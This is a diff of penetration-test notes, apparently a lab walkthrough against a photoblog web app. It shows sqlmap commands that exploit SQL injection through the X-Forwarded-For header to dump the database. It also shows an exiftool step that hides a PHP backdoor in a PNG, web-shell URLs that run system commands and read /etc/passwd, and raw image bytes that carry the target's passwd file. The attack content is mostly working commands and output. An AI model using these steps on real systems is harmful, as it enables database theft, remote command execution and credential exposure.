@@ -27,13 +27,13 @@ Connection: keep-alive
 Automating with Sqlmap
 =======================
 
-- sqlmap -u "http://victim_ip/vulnmodule.php?id=2-" --headers="X-Forwarded-For: *" --dbs
+- sqlmap -u "http://victim_ip/vulnmodule.php?id=2" --headers="X-Forwarded-For: *" --dbs
 
 available databases [2]:
 [*] information_schema
 [*] photoblog
 
-- sqlmap -u "http://victim_ip/vulnmodule.php?id=2-" --headers="X-Forwarded-For: *" -D photoblog --dump
+- sqlmap -u "http://victim_ip/vulnmodule.php?id=2" --headers="X-Forwarded-For: *" -D photoblog --dump
 
 Database: photoblog
 Table: pictures
@@ -84,6 +84,14 @@ Table: categories
 ===========================
 
 - exiftool  "-ccoment <=backdor.php" logo.png
+- http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=uname -a
+- http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=ifconfig
+- http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=cat /etc/passwd
+ 
+
+
+‰PNG  IHDR szzôsBIT|dˆ pHYs × ×B(›xtEXtSoftwarewww.inkscape.org›î<ïIDATX…Í—]lÕÇ÷ÎìÎz?¼ë;Ž×vâ€Ý€«…ª}@¥E´ŠBŠŠŠÒ–RQ_¨*Z©íKä*}hUMŠHM¨£¨j­T4&&PLUBH0"vn>°—uüµñz=^¯wggîíÃxQI¤JôHW{ï¬æüsî¹Gç ­5Ÿ¦ÉOUýÿÀ¼ÖþÒZQj¯Æžç½j™òÑíÛ¿‘¾Z===r÷îÝ @\K9rø&a'Ö¯o¨Ù¸¡Aºž"3‘V¶½°ŒÒ_Ü¹óÞáOòñØÓ)¡Lùë‡»Óp [pðåƒG¹ý]Ûº"×·_''§¦<Îºd½lhhŒ”ÝJÿÁ—F>ÉO³¤Lî¬®¯ `Ëý›[·4­[WÏ3¿{†§žzŠS§O³gÏ2™ "áÈF3/öÿ`ïƒÝY´Üú£ç†:¯àPß¡®M›ïé¸®Ó|óÍ“ŒÑù™ØÒ¾™#ýýÔ¯«˜cÇ¡¾C]WòñãÃ·ýð¹wþJ€ñí«4ƒ¦ùäM]·K‹üùp›ÛÚ0&fÀ$¬KÐßßO$µ”ãÜ%?ž h q€†-øÞOö Å/èëë3ŸOøc0à¨å?,‹wT‡wß{—x,F8Æ4M&ÑX”©©),Ë2JŽó+¸ÚUZ?ÚÓ3h>ñÝ[ò(FÊA£{`àåÛcu5ŽgM;ž5í¸Åù—^9úJ0hÝ›H$E `222LÝº$ªøˆH$‚½h#‰}ÏíûØ6ì}°;º`·$n‚¤Ð-råËƒn¥ô§ÖÔæÆÏvßj…‚5ÖääT(ªùJ(²š›6a/ÚLNNÇ1Â01LÃ0¨ ×N§ ZÁW©l¯ ?Ö{æ[==ƒ+õF¼¡·úSÑJú§Þ:y¤ySKcjSŠ÷Ç.ðÚ?^#‹póÝ,äˆÆbÌÍÍ‡ YÖš¯7|ÃÀ ZLNN‘¬KÇí¨hÅ …–äíZè èÐZ|:%ïûæ}»âKÉDLd2XVxmË²X°Ìçóÿ‹·†Þ¦°XÀ4MÓ7i€FkçV6W$œVB=º²Ê€jöQe€”ìèØúH]²Î*•KäæsLL\$T¢aÃFJ¥ù…<@€çÏÓÚÖB[[CCo³´TÄ¬ŠCJ‚Á ®[Áu½M«ŒNH¥&@¤ü-02BÐ"Gß;»­‘B’Ëå˜ 5¡æóó,-˜6Méì¼žöö-¤Óé5âRJ¤”T*.J{ªïCQC‡3@ à…>RR±^kçyÌÎLS\.â”@3?Ÿ£\.# ƒ{‘²ã0;›%233ƒ¬F`E\J‰R Ïó¢«é_ˆÙ@-@¡äi„_ý( M¥ÕÙ‚½xcöR–²ã 5,—–¹47‡ëV@ƒã8„Ã5d³Y”ÒÌNÏ°±q#†!‘B ¥@H­^Å-T5¬D±I)255åPºÜŠ&-¥àø|~AÏÌÌP\.( LN^Ä);HCRvJÄ¢1f¦gH§ÓÌårtlë@ ‰!$Bø ¨xîlÀs½¾¨Ð-TçR·i—B›½ŽS®LMM±\,!Øö"££ïá8JiÊ¥2í[·`Ë²¸ë«w’¬«[‚Õ¹Ò ×õ.~fqˆ)Œ4iÿÐ&!-ûúú†‡R¿‡5‘ÖÚ[#ZZó»üâ‹{;8sæ7ÕÜ‚a˜&£çÑÐÐÀøØx%—Ë½ðì³F®à÷ðÈ¾¡€ÒÄ]«öïð‘{ÁJ‹îž_T~¾ Æ/d:vì¥á¦¦¦TgG'³ÙYlÛ&cÛ6gÞžr+ê¡+‰¯µˆ!Z¥!^Ü»k«}Y>j+‰¥´ÖžÖÚ=~üx¾Tqvìß`éÂ…ó*‹ÑØÐÈÌô´8¶Tr»{{{—>  "D1 œª®¯éb°k×½­Áßh¥¾ ÇÑÎ:|Õ7£µvÍÿkûÔ/§ÿ5ßõ£Pîh,4tEXtCommentroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash £ÝBÈIEND®B`
+
 
 
 Database: photoblog
